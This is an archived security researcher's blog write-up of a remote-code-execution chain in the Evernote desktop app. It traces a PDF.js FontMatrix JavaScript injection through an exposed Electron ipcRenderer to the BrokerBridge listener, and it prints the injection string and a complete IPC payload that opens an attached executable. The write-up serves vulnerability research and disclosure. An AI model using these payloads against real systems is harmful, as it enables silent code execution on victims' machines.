---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-10_evernote-rce-from-pdfjs-font-injection-to-all-platform-electron-exposed-ipcrende.md
original_filename: 2024-07-10_evernote-rce-from-pdfjs-font-injection-to-all-platform-electron-exposed-ipcrende.md
title: 'Evernote RCE: From PDF.js font-injection to All-platform Electron exposed
  ipcRenderer with listened BrokerBridge Remote-Code Execution'
category: notes
detected_topics:
- xss
- supply-chain
- sso
- command-injection
- otp
- api-security
tags:
- imported
- notes
- xss
- supply-chain
- sso
- command-injection
- otp
- api-security
language: en
raw_sha256: baddf5c6665acabec34f1f43cb7347f9f428216dade6913bc06a314f1f58c0ea
text_sha256: 1546adb1f18e85b38c0df4e03c967c1fee57a63469c6328e4f2d3212fde6fcdd
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: false
---

# Evernote RCE: From PDF.js font-injection to All-platform Electron exposed ipcRenderer with listened BrokerBridge Remote-Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-10_evernote-rce-from-pdfjs-font-injection-to-all-platform-electron-exposed-ipcrende.md
- Source Type: markdown
- Detected Topics: xss, supply-chain, sso, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: False
- Raw SHA256: `baddf5c6665acabec34f1f43cb7347f9f428216dade6913bc06a314f1f58c0ea`
- Text SHA256: `1546adb1f18e85b38c0df4e03c967c1fee57a63469c6328e4f2d3212fde6fcdd`


## Content

---
title: "Evernote RCE: From PDF.js font-injection to All-platform Electron exposed ipcRenderer with listened BrokerBridge Remote-Code Execution"
page_title: "Retr0's Register"
url: "https://0reg.dev/blog/evernote-rce"
final_url: "https://0reg.dev/blog/evernote-rce"
authors: ["Patrick Peng (@retr0reg)"]
programs: ["Evernote"]
bugs: ["RCE", "XSS", "Electron", "Thick client"]
publication_date: "2024-07-10"
added_date: "2024-07-15"
source: "pentester.land/writeups.json"
original_index: 174
---

# Evernote RCE: From PDF.js font-injection to All-platform Electron exposed ipcRenderer with listened BrokerBridge Remote-Code Execution

By

Ruikai Peng

July 10, 2024

Just this week, I discovered a critical `Javascript Injection -> Remote-Code Execution` in the `Evernote` app. By **simply clicking** the shared sugar-coated note with embedded `font-injection` malicious `PDF`, the attacker can **arbitrary execute command & files** spontaneously while invisibly by exploiting the preloaded-and-exposed `ipcRenderer` Electron `Inter-Process-Communication` API with the `Evernote`'s built-in `IPC` event listener *`'BrokerBridge'`*in the `Main Process`. As much as I struggled for `6 hours` (Even though I spent way long to writing this blog) from `scratch` in this fully-obscured massive application to create a 4-step call-chain `IPC` payload, I still think this will be great material to share and look at:) _( Funny-thing, I was on the wrong track for around 2 hours then realizing_`IPC` is actually the key, meaning when I found this as 0day, I start to look for the sink for `RCE` rather the `ipcRenderer` related aspects )

In today's blog, we will be exploring the `Evernote XSS->RCE` journey that contains:

  * Understanding how `Electron`'s `Multi-Process` Model, `IPC` handlers, and `preload.js` functions;

  * Absorbing how `PDF.js`'s `font-injection` JavaScript Injection works;

  * Reversed-Engineering and debugging `Evernote`'s `asar-packed` obscurated source from a `250 million users` _(According to random reddit post)_ and `16` years maintained `Electron` project entirely **from**`NULL` to `1`;

  * Diving into `Electron` -> `IPC` event communication in built real-life instance an how we exploited a `RCE` vector via two `Inter-process` bridges with complex designing.

## `PDF.js`: Font-Injecting

> The exploitation started the probably most used file format on earth - `.PDF`

`Evernote` as a great note integration application, allows users to embedded `PDF` files inside of note for viewing and marking them, indeed a wonderful feature for `Evernote` to implement, nevertheless, it also served as the starting point for our exploitation chain, turning a useful feature into a critical vulnerability.

For the integrated `PDF` interactions, `Evernote` used one of the mostly-used PDF plugin - `PDF.js`, which allows you to interact and interpret to `PDFs` with out these heavily-compiled `C++` binaries; you can get easy access to `PDFs` by simply importing the `pdfjs-dist` package built with `Javascript`; For `PDF.js` to operate on production environments, the maintainer team had to develop their own logic and code for `extracting` and `renderingPDF metadata`, where the unexpected issue occurred.

### Fondly fonts

The reason why we all use `PDFs` is because that `PDFs` can save file regardless different rendering environment, for example, the `.docx` file your teacher sent to you always look weirdly on your computer; as one of the superpower of `PDFs`, `PDFs` can embeds fonts in the metadata for further usage in the rendering process, which actually turned `glyphs` into `curves` like images (Also known as `vectorization`). For this to happened swiftly, `PDF.js`'s optimizing team introduced `pre-compiled path generator function` of these `glyphs`:
  
  
  // If we can, compile cmds into JS for MAXIMUM SPEED...
  if (this.isEvalSupported && FeatureTest.isEvalSupported) {
  const jsBuf = [];
  for (const current of cmds) {
  const args = current.args !== undefined ? current.args.join(",") : "";
  jsBuf.push("c.", current.cmd, "(", args, ");\n");
  }
  // eslint-disable-next-line no-new-func
  console.log(jsBuf.join(""));
  return (this.compiledGlyphs[character] = new Function(
  "c",
  "size",
  jsBuf.join("")  // Kaboom!
  ));
  }
  

> this is done by making a JavaScript `Function` object with a body (`jsBuf`) containing the instructions that make up the path

However, as our hacker-instinct triggered, in case that we have control over the `cmds` being parsed by `new Function(`; it will be possible to control the execution flow of the `PDFs` since our payload will be `evaluated` by the parsed `new Function(` as well, thus, lets source-to-sink into how the source `cmds` can be parsed;
  
  
  compileGlyph(code, glyphId) {
  if (!code || code.length === 0 || code[0] === 14) {
  return NOOP;
  }
  
  let fontMatrix = this.fontMatrix;
  ...
  
  const cmds = [
  { cmd: "save" },
  { cmd: "transform", args: fontMatrix.slice() },
  { cmd: "scale", args: ["size", "-size"] },
  ];
  this.compileGlyphImpl(code, cmds, glyphId);
  
  cmds.push({ cmd: "restore" });
  
  return cmds;
  }
  

Jumping into `compileGlyph`, this function initializes commands for `vectorization`, processing and passing our watch-listed `cmds`. A critical point of concern is the construction of `cmdtransform` with the arguments `fontMatrix.slice()`, derived from `this.fontMatrix`. where `PDF.js` generates `vectorization` commands such as `save`, `transform`, and `scale`; Which is then parsed into the previous `new Function(` evaluation; But the million-dollar question here is how `this.fontMatrix` is parsed. By default, `FontMatrix` is set to `[0.001, 0, 0, 0.001, 0, 0]`, leading us to speculate that it might originate as a numeric array from the metadata.
  
  
  extractFontHeader(properties) {
  let token;
  while ((token = this.getToken()) !== null) {
  if (token !== "/") {
  continue;
  }
  token = this.getToken();
  switch (token) {
  case "FontMatrix":
  const matrix = this.readNumberArray();
  properties.fontMatrix = matrix;
  break;
  

The `extractFontHeader` method seemly extracts the `FontMatrix` token value from the `metadata`, in this case with `readNumberArray`, meaning we will be entirely stuck with numerical inputs, making it not possible for `Javascript Injections`! Nevertheless, remember to never give up in finding solutions, in this case, our `FontMatrix` might also derives from the `PartialEvaluator.translateFont(...)` that loads tons of `PDF` attributes associated with font:
  
  
  const properties = {
  type,
  name: fontName.name,
  subtype,
  file: fontFile,
  ...
  fontMatrix: dict.getArray("FontMatrix") || FONT_IDENTITY_MATRIX,
  ...
  bbox: descriptor.getArray("FontBBox") || dict.getArray("FontBBox"),
  ascent: descriptor.get("Ascent"),
  descent: descriptor.get("Descent"),
  xHeight: descriptor.get("XHeight") || 0,
  capHeight: descriptor.get("CapHeight") || 0,
  flags: descriptor.get("Flags"),
  italicAngle: descriptor.get("ItalicAngle") || 0,
  ...
  };
  

Cool! the source of `fontMatrix` defined in `PartialEvaluator.translateFont(...)` doesn't seem to be numerical limited! allowed us to inject our `javascript` payload as `fontMatrix` -> `compileGlyph` -> `new Function(`; Nevertheless to exploit this, we must understand how `fonts` works in `PDFs`; where the `font` is actually consist of the `/Font`, `/FontDescriptor` and the `/FontFile`, structured like:
  
  
  1 0 obj
  <<
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
  >>
  endobj
  

Taking a look back at into `fontMatrix` reference-er, the `dict.getArray("FontMatrix")` actually referenced the `/Font` object, therefore, we can create an custom `/Font` object with our-own specified `/FontMatrix`
  
  
  1 0 obj
  <<
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
  /FontMatrix [1 2 3 4 5 6]  % <-----
  >>
  endobj
  

However, this payload won't work directly since our `/FontMatrix` will be referencing `default matrix` embedded inner the `Type1 font`, we can try to firstly import an `Type1 font` without internal `FontMatrix` definition, which as `PDF.js` defines `PartialEvaluator.translateFont(...)` will be replacing authoritative as the substitution of the `default matrix`, allows us to gain fully control over the suspected `FontMatrix`. Combined with this, we can try to turn the `/FontMatrix [1 2 3 4 5]` into something like `/FontMatrix [1 2 3 4 5 (0\); alert\('PDF')]`, where the `c.transform` will be literally interpreted as `/FontMatrix [1 2 3 4 5]` and follows the `alert\('foobar')`; Allowing us to inject arbitrary `Javascript` into the `PDF`, which then will be interpreted as evaluated when the `glyphs` going through the `pre-compiled path generator function`; Allowing Arbitrary `Javascript Injection`!

## Evernote: IPC & RCEs

**Evernote** , as one of the most-used application on the earth with `225-250 million users` _(according to this_ [_random reddit post_](https://www.reddit.com/r/Evernote/comments/18es5f5/how_many_people_pay_for_evernote_in_2023/) _)_ ; as we inspected `Evernote`'s `PDF` integration feature, we found that `Evernote` is influenced by this catastrophic supply-chain attack of this `PDF.js` `Javascript Injection` as it's implementing `PDF.js`; as `.pdf` subfix file being embedded into the `Evernote` -> `supernote`, the PDF will be preloaded via a sort of re-packed customed `pdfjs-dist` to previewing! this allowed us to injection Arbitrary JavaScript into any `supernote` which will executes the injected JavaScript code in `FontMatrix` whenever the PDF is loaded;

For an normal penetration or bug-hunting journey, an Stored-XSS that can be triggered easy by examine a note seemed really powerful and influential since we can achieve account-overtaking, worming inflecting other dividual accounts, and viewing private-notes and fetch them to remote-listen-address... Nevertheless, as I furtherly exploration goes, I found that the rendering sink (`XSS`) in `evernote` clients actually takes place at `document.location.origin` -> `app://evernote` but not iframe-ed or webpack-ed! This in one hand forbids us for gaining direct access to the login tickets such as `ducument.cookie` and other `evernote.com` resources, but in other hand, allowed us for accessing the local privileged APIs and exposed object in the local domain! This made our XSS possible to RCE at the first extend!

As we promised, we will dig into how escalated this exploitation into Remote-Code Execution, but before that, there's something very important that we might need to understand: `Electron`'s `Multi-Process` and `IPC`

### **Client: Electron and Multi-Process Model**

For the most of times, people downloads the client version of application to get access to more features; For instances, local-file management, referencing resources on your hard-drives, screen-shooting and easy-access to clipboards etc; and for all of this to happens swiftly, easily, and securely; `Electron` \- an open-source software framework based on `Node.js` and `Chromium` is introduced and used for 90% of desktop clients developments such as `1Password`, `Notion`, `draw.io`, .... and of course our legendary `Evernote`; However, to prevent situation like unexpected injection of JavaScript escalate easily into remote-code execution, smart developer at `electron` introduced something very smart - The `Multi-Process Model`, which is also used in `Chromium`.

![The Multi-Process Model](https://miro.medium.com/v2/resize:fit:1182/1*cU1QVhNk_QIrtgo8xSw5Hg.png)

The `Multi-Process Model` isolated the `main process` (which have direct access to hardware, able to require external packages with `require()`) with the `renderer process` that generated for each tabs, in this case, your `youtube` tab will not be able to access `DOM Trees`, `Sensitive Information` on your bank website, while forbidden you from:

  1. Execute **arbitrary JavaScript in renderer** (XSS or navigation to external sites)

  2. **Overwrite the built-in method** which is used in preload or Electron internal code to own function

  3. **Trigger** the use of **overwritten function**

Additionally, `electron` introduced the `nodeIntegrations` feature, with `nodeIntegrations` set as false, we can't directly execute-codes on you PC via `require('child_process')` which is a `Node.js` feature; same goes in `Evernote`, this mechanism prohibits us to directly execute codes via the compromised `PDF.js` integrated components, but here's still fun stuffs we can do with this `XSS`:

  * `window.` object referencing: accessing the `window.top`, `window.location`, redirecting to cat videos

  * `DOM-Tree Access` (Current Process): Changing existing `DOM` trees, modifying the note pages

  * `Client-Side Request Forgery`: Sending request via `fetch()` etc; (This depends on the `CSP` setting)

Nevertheless, due to the `domain` setting of the `PDF.js` component, we don't have direct access over the `document.cookie` (Not the `document.cookie` you will expected); Thus there's nothing interesting worth spending our time one, instead, we are getting our `Remote-Code Execution` in a interest way: utilizing the `IPC` protocol and built-in `BrokerBridge`.

Before diving into the concept of `IPC`, we must know that it's not impossible for `renderer process` to interact with the external _real-world_ outside of the `sandbox`. The magic depends on the `"preload"` script (yes the `preload` script introduced in our `electron blog`). Viewing through the source for any `electron` application, you will find that `electron` deals with new `window-objects` with a more complex way, instead, they commonly use something looks like this, with the `electron`'s special `createWindow` method.
  
  
  (lT = Mt.register("boron.actions.showEditorContextMenu", cT)),
  (this.isCreatingWindow = !1),
  this.trackHWUsage(),
  this.window
  );
  } catch (e) {
  return uT.error("Error while creating window", e), null;
  } finally {
  this.isCreatingWindow = !1;
  }
  }
  async getMainBrowserWindowOpts() {
  var e;
  const t = await rT(hc, {}),
  n = {
  minHeight: 480,
  minWidth: 840,
  simpleFullscreen: !1,
  webPreferences: {
  plugins: !0,
  nodeIntegration: !1,
  contextIsolation: !0,
  preload: L().resolve(Ps.mainPath, "preload.js"),
  webSecurity: !0,
  partition: Ts(),
  spellcheck: !0,
  webviewTag: !0,
  sandbox: !1,
  },
  icon: s.nativeImage.createFromPath(Ps.appIconPath),
  show: !1,
  };
  if (null !== (e = t.main) && void 0 !== e && e.screenDimensions)
  return (
  (n.x = t.main.screenDimensions.x),
  (n.y = t.main.screenDimensions.y),
  (n.width = t.main.screenDimensions.width),
  (n.height = t.main.screenDimensions.height),
  n
  );
  

Looking at the `webPreferences` here, `webPreferences` specified `contextIsolation`, `preload`, `partition`, `sandbox`, where `contextIsolation` specified `Multi-Process Model` as we mentioned above (`nodeIntegration` is set to `false` by default, in case if it's turned on, we can `require` `Node.js` features easily via `require()`, `contextIsolation` set to true thus we can't directly **Overwrite the built-in method**). Nevertheless, the key to `RCE` in this case is the `preload` setting; which is pointing to `L().resolve(Ps.mainPath, "preload.js")`.

As we introduce in the `electron-math` blog, the `prelaoded` scripts have direct access to `Node.js` feature due to they are loaded before the `renderer process`, where developers usually exposes additional `API` endpoint as feature for interactions that required `Node.js` feature such `os.openPath` etc. In our case, I found that `Evernote` aren't loading everything in the `preload.js`; Instead, they did it in a fancy but way more complex way:
  
  
  const l = void 0,
  d = (0, n.createLogger)("boron:preload"),
  { userAgentString: c } = s.Z;
  o.contextBridge.exposeInMainWorld("userAgentString", { get: () => c }),
  (window.onload = () => {
  const e = {
  applicationTitle: "Evernote",
  applicationRole: "BoronPreload",
  isAutoUpdateAllowed: l,
  broker: t.Z,
  localizedAppTitleKey: "Account.header.title",
  objectPersistence: l,
  triggerLogin: l,
  triggerLogout: l,
  initConduit: l,
  shutdownConduit: l,
  };
  (0, a.j)(e);
  }),
  document.addEventListener("keydown", (e) => {
  123 === e.which && o.ipcRenderer.invoke("toggleDevTools");
  }),
  window.addEventListener("error", (e) => {
  d.error("Error :", e);
  });
  const { ionOpts: u } = s.Z;
  (window.__ionOpts = u),
  (window.electronApi = { ipcRenderer: o.ipcRenderer }),
  o.contextBridge.exposeInMainWorld("electronApi", {
  ipcRenderer: {
  on: (e, t) => o.ipcRenderer.on(e, t),
  send: (e, ...t) => o.ipcRenderer.send(e, ...t),
  removeAllListeners: (e) => o.ipcRenderer.removeAllListeners(e),
  invoke: (e, ...t) => o.ipcRenderer.invoke(e, ...t),
  },
  });
  const p = o.ipcRenderer.sendSync("getWindowId");
  o.contextBridge.exposeInMainWorld("electronWindowId", { get: () => p });
  const { appVersion: m } = s.Z;
  o.contextBridge.exposeInMainWorld("appVersion", {
  get: () =>
  m.startsWith("10")
  ? `Evernote ${m} / ${navigator.appVersion}`
  : navigator.appVersion,
  }),
  

Since the actual `preload.js` contain tons of translation chunks and other codes that aren't that helpful for the interpretation, I trimmed the key parts that will be helpful to our `RCE` journey. As here, we can see there's 4 `API`s that exposed to us in the current context via the `o.contextBridge.exposeInMainWorld(` method through the `contextBridge`; They are the `userAgentString` which returns a your globally-stored `User Agent` string; `toggleDevTools` that allows you to open F12 _(Actually I spent a hour figuring out how to open_ `F12` debugging then I suddenly realize you can open it directly via `F12`); `electronWindowId` that returns the `WindowID`; `appVersion` that returns the `appVersion`, and finally, the million dollar `API`: `electronApi`, which allows us to `Inter-Process` Communication via the `IPC` Protocol.

As the `Multi-Process Model` got introduced into `Electron`, a method for `Inter-Process Communication` is required at the same time, here `Electron` introduced the `ipcRenderer` render method for solving this issue; the registered `ipcRenderer` in our `preload.js` allows 4 actions: `on`, `send`, `removeAllListeners`, `invoke`; which is the keystone for the `Inter-Process Communication` concept. For different process mostly between the `Main Process` and the `Renderer Process`, the `ipcRenderer` handle allows you to listen on a specific `IPC Listener` endpoint and communicate to other `Process` via these `IPC Listener` endpoints. (`ipcRenderer.send` only sends the message, while `ipcRenderer.invoke` waits for the feedback). Same happens in the case of `Evernote`, whenever `Evernote` needs to execute actions beyond the `Renderer Process` ability, `Evernote` will invoke a `ipcRenderer.invoke` into the `Main Process`.

In our case that we intended for a `Remote-Code Execution` with the previously found `Javascript Injection`, our best exploitation vector considering `Evernote`'s features will be downloading and executing a malicious script file / elf soundlessly. Nevertheless, the million dollar question is that: How and which listener does `Evernote` sets for such action

> **Summary of the chapter:** The `Javascript Injection` in `Evernote` is found via the `Font-Injection` vulnerability in `PDF.js` Component; Nevertheless, due to `nodeIntgration`, `contectIsolation`, `triggering domain` of `Electron`, we cannot either hijack user's `cookies` nor directly require `Node.js` feature as medium for `Remote-Code Execution`. However exposed `ipcRenderer` handler in `preload.js` enables us to `Inter-process` communicate with other listen `IPC` `endpoints` in `Main Process`, but what should we look for and how should we do it?

### **Virtual-to-Reality:** `BrokerBridge`

Exposed `ipcRenderer` handler in the `preload.js` finally leads us the starting points for the `RCE` journey in `Evernote`, since `Evernote`'s complex `Electron` structure and fully obscured source which we reverse-engineered from the `app.asar`; Finding this execution-chain for the `ipcRenderer` to the finally **fetch and open** action will need a much more hard-working, but at least, we know where to start.

By globally-matching the string `"attachment"`, you will find about of 500 matches of `"attachment"` where most of them are in localization or some highly compressed chunks that needs prettier formatting for readability. Finding the actual handler in this tons of information is a tons of work at the same time. After searching for around 2 hours, you might be sensitive about the object `'boron'` as it kept re-occurring whether as globally-exposed objections or in the localization file; which you will fin this method, the largest keystone for our `RCE` journey (where reverse-tracking the sink `shell.openPath` then constant x-referencing will probably leads you to)
  
  
  Mt.register(
  "boron.actions.openFileAttachment",
  async ({ resource: e, url: t, noteGuid: n, appName: r }) => {
  try {
  if (!t) return;
  const o = (await (0, ea.getCurrentUserID)()).split(":")[1],
  a = lv({ resource: e, noteGuid: n, userID: o });
  if (O().existsSync(a))
  await cv({ filePath: a, resource: e, noteGuid: n, appName: r });
  else {
  const i = lv({
  resource: e,
  noteGuid: n,
  userID: o,
  oldPathOverride: !0,
  });
  O().existsSync(i) ? O().moveSync(i, a) : O().ensureFileSync(a);
  const s = await (0, es.getResource)(t),
  l = O().createWriteStream(a);
  s.stream
  .pipe(l)
  .on("error", (e) => {
  av.error(`Failed to save file: ${e}`),
  jp("Message.openFileAttachment.failure");
  })
  .on("close", async () => {
  bt.Z.isMac && (await uv(a)),
  await cv({
  filePath: a,
  resource: e,
  noteGuid: n,
  appName: r,
  });
  });
  }
  } catch (e) {
  av.error(`Error in openFileAttachment: ${e}`),
  jp("Message.openFileAttachment.failure");
  }
  }
  

Due to the how the fully-obscured the codes is, is pretty much impossible to locate definition for each objects, even though the symbols for parsed arguments aren't obscured, it still too-vague for us directly construct a request to this `boron.actions.openFileAttachment`, even regardless this `Mt.register` is not registered under the `ipcRenderer` protocol rather something else; now, the more worth considering problem is how `boron.actions.openFileAttachment` can be invoked? what parameter we are required to parsed into to make it invoke `shell.openPath` (it's actually triggered in obscured `cv()` method in this context, you can know this by the remain `argument symbols` referencing to one sink you might reverse-engineered into search for sink `shell.openPath` as previously mention). If you kept looking for `boron.actions.openFileAttachment`, will leads you here: _(This chunk is to much for_ `Prettier` to handle but we can still read it)
  
  
  async function a(e){return i.execute({id:e})}const r=i},134295:(e,t,n)=>{n.d(t,{HH:()=>r,Un:()=>f,cJ:()=>d,dP:()=>l,iw:()=>m,jw:()=>s,oB:()=>c,u6:()=>u,uM:()=>p,xb:()=>a});var o=n(719959),i=n(593013);function a(e){if((0,i.Ld)())return o.default.call("boron.actions.showEditorContextMenu",e)}function r(e){if((0,i.Ld)())return o.default.call("boron.actions.setNativeFilesForDrag",e)}function s(e){if((0,i.Ld)())return o.default.call("boron.actions.setNativeFilesForCopy",e)}function l(e){return o.default.call("boron.actions.closePopupNoteWindows",e)}function c(e,t,n=!1){d(e,[t],n)}function d(e,t,n=!1){o.default.publish(`boron.action.dispatch.${e}`,null,{actions:t,moveFocus:n},!1)}function u({fileName:e,url:t}){return o.default.call("boron.actions.saveFileAttachment",{fileName:e,url:t})}function m({attachments:e}){return o.default.call("boron.actions.saveAttachments",{attachments:e})}function p({resource:e,url:t,noteGuid:n,appName:i}){return o.default.call("boron.actions.openFileAttachment",{resource:e,url:t,noteGuid:n,appName:i})}function f({resource:e,noteGuid:t}){return o.default.call("boron.actions.updateOpenedFileAttachment",{resource:e,noteGuid:t})}},341447:(e,t,n)=>{n
  

which is meaningless at all points since the `o.default.call`'s `o` is equals to `n(719959)`, the function is a integer passed into a function where another integer is passed in; Thus the only trick here, is to use dynamic debugging.

#### **Dynamic Debugging:** `Step-in`

By using `Shift+Ctrl+F`, you can globally search a string in the `F12`'s `Source` menu, the `Mt.register("boron.actions.openFileAttachment")` related sink that you can find is actually under the `970.js` -> `function b({resource: e, url: t, noteGuid: n, appName: r}) {`. Setting a breakpoint on it then press open attachment, the breakpoint will be triggered with all passed variable {`e,t,n,r`} shown on the right side, while full `Call Stacks` shown.
  
  
  function b({resource: e, url: t, noteGuid: n, appName: r}) {
  return a.Z.call("boron.actions.openFileAttachment", {
  resource: e,
  url: t,
  noteGuid: n,
  appName: r
  })
  }
  

Nevertheless, these information aren't still efficient enough to directly call the `boron.actions.openFileAttachment` via `b({resource: e, url: t, noteGuid: n, appName: r})` nor `a.Z.call("boron.actions.openFileAttachment"`, since as much we can reference the local variable as we want in this paused frame, in the `Javascript Injection` context will be came not-callable since these functions are neither `exposeInMain` or expose in other ways, instead, we will needs to `Step-in` into the function.

  1. **Step-In #1** : `boronMain.js` with `719959: (_,E,T)=>{ T.d(E, { Z: ()=>O }); var e = T(686200); const O = new class { subscribe(_, E, T) { return (0, e.Z)().broker.subscribe(_, E, T)`, in which we can already see our good friend `.broker.subscribe`. Another step-in, we will reach;

  2. **Step-In #2** : `970.js` -> `function b({resource: e, url: t, noteGuid: n, appName: r}) {` being Revoked. Nevertheless the file is not executed / opened;

  3. **Step-In #3** : `boronMain.js` with `call = (_,E)=>(0, e.Z)().broker.call(_, E);`: **New state** , where `_ = boron.actions.openFileAttachment`, `E: { "resource": { "hash": "4a4be40c96ac6314e91d93f38043a634", "mime": "application/octet-stream", "rect": { "left": 56, "top": 155, "width": 376.0000305175781, "height": 43.42857360839844 }, "state": "loaded", "reference": "3298a792-a64e-4fc6-b405-19b28d660343", "selected": true, "url": "en-cache://tokenKey%3D%22AuthToken%3AUser%3A246318479%22+34154c29-b864-0f2d-fab9-0244a07d9495+4a4be40c96ac6314e91d93f38043a634+https://www.evernote.com/shard/s594/res/54aefdb1-9c1b-008f-09a1-450408bcca92", "isInk": false, "filesize": 4, "filename": "cat.exe" }, "url": "en-cache://tokenKey%3D%22AuthToken%3AUser%3A246318479%22+34154c29-b864-0f2d-fab9-0244a07d9495+4a4be40c96ac6314e91d93f38043a634+https://www.evernote.com/shard/s594/res/54aefdb1-9c1b-008f-09a1-450408bcca92", "noteGuid": "34154c29-b864-0f2d-fab9-0244a07d9495", "appName": "" }`

  4. **Step-In #4** & **Step-In #5** : Passing steps;

  5. **Step-In #6** : `boronMain.js` at `call: (_,E)=>new Promise(((T,e)=>{`; **Reaching to:** `window.electronApi.ipcRenderer.send("BrokerBridge"`
  
  call: (_,E)=>new Promise(((T,e)=>{
  const O = r();
  R[O] = ({id: _, error: E, result: O})=>{
  delete R[_],
  E ? e(E) : T(O)
  }
  ,
  window.electronApi.ipcRenderer.send("BrokerBridge", {
  action: o.CALL,
  id: O,
  topics: _,
  data: E
  })
  }
  )),
  clearTopics: function(_) {
  window.electronApi.ipcRenderer.send("BrokerBridge", {
  action: o.CLEARTOPICS,
  topics: _
  })
  }
  };
  

### **RCEs: Bridge-to-Bridge, Chain-to-Chain**

Here finally reached a state with the `exposeInMainWorld` -> `ipcRenderer.send` that can be access in the preloaded `window.electronApi.ipcRenderer.send`! By setting another breakpoint at exactly `window.electronApi.ipcRenderer.send`, we can examinate any data being parsed from the `function b({resource: e, url: t, noteGuid: n, appName: r}) {` to here, and the local parameter `topic, id, topic, data`,

![](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202407102344972.png)

where by `step-in` further you can see how the `ipcRenderer.send` is being parsed into `global_init`'s `"./lib/renderer/api/ipc-renderer.ts": (e,t,r)=>{` but unfortunately you can't step-in to the `main.js` since not loaded in current context. But nevertheless, with `BrokerBridge` as a keywords for us, we can locate the `IPC Listener` for `BrokerBridge` in the `main.js:308544`; The `s.ipcMain.on("BrokerBridge", async (e, t) => {` with listened `switch cases`. `HELLO`, `REGISTER`, `CALL`. From what we seen at `main.js:291697`, we can also take a wild guess the `boron.actions.openFileAttachment`'s `Mt.register(` is actually binding the `boron.actions.openFileAttachment` to the `BrokerBridge` for cross-context usage;
  
  
  async onAppReadyPreConduit() {
  var t;
  await ZA(),
  on.dispatch({ type: en.LOCALIZATION_READY, user: null }),
  s.ipcMain.on("BrokerBridge", async (e, t) => {
  const { sender: n } = e,
  {
  id: r,
  action: o,
  topics: a,
  type: i,
  data: s,
  saveMessage: l,
  replayMessage: u,
  } = t,
  d = Fs[n.id];
  switch (o) {
  
  
  // CASE HELLO
  case Is.HELLO:
  Fs[n.id] = {
  unsubscribers: {},
  unregistrants: {},
  callbacks: {},
  };
  break;
  
  
  // CASE REGISTER
  case Is.REGISTER:
  if (!d) {
  Us.warn(
  `Cannot register id ${r}. No sender window with id ${n.id}`
  );
  break;
  }
  d.unregistrants[r] = Mt.register(
  a,
  (e) =>
  new Promise((t, o) => {
  const a = bo().v4();
  (d.callbacks[a] = ({ id: e, result: n, error: r }) => {
  delete d.callbacks[e], r ? o(r) : t(n);
  }),
  n.send("BrokerBridge", {
  action: Is.RUN_REGISTRANT,
  id: r,
  cbid: a,
  payload: e,
  });
  })
  );
  break;
  
  // CASE CALL  
  case Is.CALL:
  try {
  try {
  const e = await Mt.call(a, s);
  n.send("BrokerBridge", {
  action: Is.CALL,
  id: r,
  result: e,
  });
  } catch (e) {
  Us.warn(`Error: ${e.message}`),
  (p = e),
  Object.getOwnPropertyNames(p).forEach((e) =>
  Object.defineProperty(p, e, {
  ...Object.getOwnPropertyDescriptor(p, e),
  enumerable: !0,
  })
  ),
  n.send("BrokerBridge", {
  action: Is.CALL,
  id: r,
  error: e,
  });
  }
  } catch (e) {
  Us.error(`Error: ${e.message}`);
  }
  break;
  

Here as the `debugging` information told us (`send: (e,...n)=>r.ipcRenderer.send(e, ...n),`: `e: BrokerBridge`, `{ "action": "Bridge/Call", "id": "11a261fa-3f93-4811-b7b8-a50f3a25f506", "topics": "boron.spidersense.track", "data": { "categories": [ "delta", "remote_config", "empty" ], "severity": "info", "info": {} } }`) the `ipcRender` actually sent a request to the `ipcMain Listened endpoint`: `s.ipcMain.on("BrokerBridge", async (e, t) => {`, in which the `"action": "Bridge/Call"` specified into the `case Is.CALL:` switch, which runs `Mt.call(a, s);` (same `Mt`) that we firstly found `Mt.register("boron.actions.openFileAttachment",`, calling the `cv({ filePath: a, resource: e, noteGuid: n, appName: r });`, **opening the file,** `RCE`!; Thus, we created the payload:
  
  
  window.top.electronApi.ipcRenderer.send('BrokerBridge', {action: 'Bridge/Call',id: '7e803824-d666-4ffe-9ebb-39ac1bd7856f',topics: 'boron.actions.openFileAttachment',data:{'resource': {'hash':'2f82623f9523c0d167862cad0eff6806','mime': 'application/octet-stream','rect': {'left': 68,'top': 155,'width': 728.1428833007812,'height': 43.42857360839844},'state': 'loaded','reference': '22cad1af-d431-4af6-b818-0e34f9ff150b','selected': true,'url': 'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','isInk': false,'filesize': 45056,'filename': 'calc.exe'},'url':'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','noteGuid': 'f4cbd0d2-f670-52a7-7ea7-5720d65614fd','appName': ''}})
  

Summarizing the call-chain:

`Main Process`:

  1. `Mt.register("boron.actions.openFileAttachment"` got registered under the `Main Process -> Mt`;

  2. `IPC Listener -> s.ipcMain.on("BrokerBridge", async (e, t) => {` registered under `IPC` Name `BrokerBridge`;

  3. `s.ipcMain.on("BrokerBridge", async (e, t) => { → const e = await Mt.call(a, s);` got register under the `IPC Endpoint` as `Is.CALL`

`Renderer Process` (Victim Process):

  1. Victim Loads malicious Shared Note

  1. Malicious `Font-Injection` PDF invoked `PDF.js` previewing

  2. Embedded Payload in `/FontMatrix` evaluated and executed incorrectly via `pre-compiled path generator` function of the `c.transform` → `function`, triggering `Javascript injection`; Execution of the payload.

  2. Payload invoked `window.top.electronApi.ipcRenderer.send(`

  1. `ipcRenderer.sent` -> `BrokerBridge` invoked `IPC Listener` -> `s.ipcMain.on("BrokerBridge", async (e, t) => {`

  2. Parameter `action` -> `Bridge/Call` triggered `BrokerBridge` -> `Is.CALL` via switch

  3. `BrokerBridge` -> `Is.CALL` triggered `const e = await Mt.call(a, s);` via execution-flow

  1. `Mt.call(` called `topics`: `boron.actions.openFileAttachment` with `data`

